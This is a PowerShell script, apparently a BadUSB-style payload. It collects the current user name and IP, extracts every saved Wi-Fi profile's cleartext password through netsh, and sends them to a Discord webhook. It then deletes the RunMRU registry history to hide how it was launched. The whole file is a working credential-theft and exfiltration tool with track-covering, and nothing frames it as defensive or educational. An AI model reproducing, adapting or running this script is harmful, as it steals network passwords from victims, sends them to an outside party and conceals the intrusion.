# Get user name and ip
$user = $env:USERNAME
$ip = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString


$wifiProfiles = netsh wlan show profiles |
                Select-String -Pattern ":" |
                ForEach-Object { $_ -replace ".*: ", "" } |
                ForEach-Object { netsh wlan show profile name=$_ key=clear} |
                Select-String -Pattern "Absent$|Key Content|Contenu|Nom du SSID" |
                ForEach-Object { $_ -replace ".*: ", ""}


# Table output where the first column is the profile name index%2==0 and the second column is the password index%2==1
$output = $wifiProfiles | ForEach-Object -Begin { $i = 0 } {
    if ($i % 2 -eq 0) {
        $profile = $_
    } else {
        $password = $_
        [PSCustomObject]@{
            "Profile" = $profile
            "Password" = $password
        }
    }
    $i++
} | Format-Table -AutoSize | Out-String

print($output)

# Send the file to Discord

$jsonBody = @{
    content = "Here are the wifi passwords from $user with the ip $ip"
    embeds = @(
        @{
            title = "Wifi Passwords"
            description = $output
            color = 16711680
        }
    )
    
} | ConvertTo-Json

$hookurl = "$dc"

Invoke-RestMethod -Uri $hookurl -Method Post -Body $jsonBody -ContentType "application/json" 

print("Wifi passwords sent to Discord")

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f



exit


